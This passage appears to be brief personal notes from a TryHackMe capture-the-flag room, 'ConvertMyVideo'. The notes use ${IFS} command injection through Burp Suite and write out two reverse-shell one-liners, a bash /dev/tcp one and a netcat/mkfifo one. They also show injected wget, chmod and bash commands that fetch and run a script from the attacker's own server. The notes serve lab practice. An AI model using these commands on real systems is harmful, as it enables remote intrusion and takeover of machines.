...
</br> 5) ConvertMyVideo (tryHackMe)
- burpsuite repeater
- ${IFS} separator used for field injection
- bash reverse shell one-liner ->
 </br><b> bash -i >& /dev/tcp/10.0.0.1/8888 0>&1</b>
- python server shuffle
</br> <b> python -m SimpleHTTPServer 7000 </b>
</br> paired with wget command (injected in this case)
</br> <b>wget${IFS}ip.address:port/myFile.sh </b>
</br>give execution perms
</br> <b>chmod${IFS}777${IFS}myFile.sh</b>
</br> execute bash file
</br> <b> bash${IFS}myFile.sh</b>
- other failed one-liner: <b> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f</b>
